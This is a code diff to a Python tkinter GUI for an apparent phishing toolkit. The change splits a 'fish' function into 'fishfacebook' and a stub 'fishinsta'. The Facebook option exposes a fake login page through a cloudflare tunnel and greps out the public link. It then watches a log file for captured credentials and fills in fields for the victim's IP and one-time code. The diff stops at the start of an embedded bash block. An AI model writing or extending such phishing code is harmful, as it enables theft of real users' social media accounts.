@@ -2,16 +2,18 @@ from tkinter import *
 import os, sys, linecache, time
 from tkinter.ttk import *
 def sites():
-	def fish():
+	def fishinsta():
+		None
+	def fishfacebook():
 		def linkwindow():
 			f = open("process/new.txt")
 			copyplace.delete(0, END)
 			copyplace.insert(INSERT, f.read())
-		link = os.system("cd assets; hostit -f cloudflare 8080 > ../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../process/link.txt' > ../process/new.txt; rm ../process/link.txt")
+		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 > ../../../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
-			file_size = os.path.getsize('assets/log.txt')
+			file_size = os.path.getsize('assets/sites/facebook/log.txt')
 			while True:
-				new_size=os.path.getsize('assets/log.txt')
+				new_size=os.path.getsize('assets/sites/facebook/log.txt')
 				if (new_size > file_size):
 					os.system("bash assets/bashscript.sh")
 					break
@@ -29,7 +31,7 @@ def sites():
 			otparea.insert(INSERT, i.read())
 		def ipfinder():
 			j = open("process/ip.txt")
-			otparea.delete(0, END)
+			ipplace.delete(0, END)
 			ipplace.insert(INSERT, j.read())
 		root3 = Tk()
 		root3.title("link")
@@ -42,7 +44,7 @@ def sites():
 		
 		listener = Button(root3, text="start capturing", command=capture).grid(row=1,column=0)
 	
-		ip = Button(root3,text="username", command= ipfinder)
+		ip = Button(root3,text="ip", command= ipfinder)
 		ip.grid(row=2, column=0)
 		ipplace= Entry(root3, width=60, font="Calibri 10")
 		ipplace.grid(row=2, column=2)
@@ -69,8 +71,9 @@ def sites():
 	root1 = Tk()
 	root1.geometry('500x300')
 	root1.title("coose option")
-	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fish).grid(row = 0, column = 0)
-	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 1)
+	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fishfacebook).grid(row = 0, column = 0)
+	option1 = Button(root1, text = 'instagram',style = 'W.TButton', command = fishinsta).grid(row = 0, column = 1)
+	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 3)
 	root1.mainloop()
 os.system("""
 #!/bin/bash
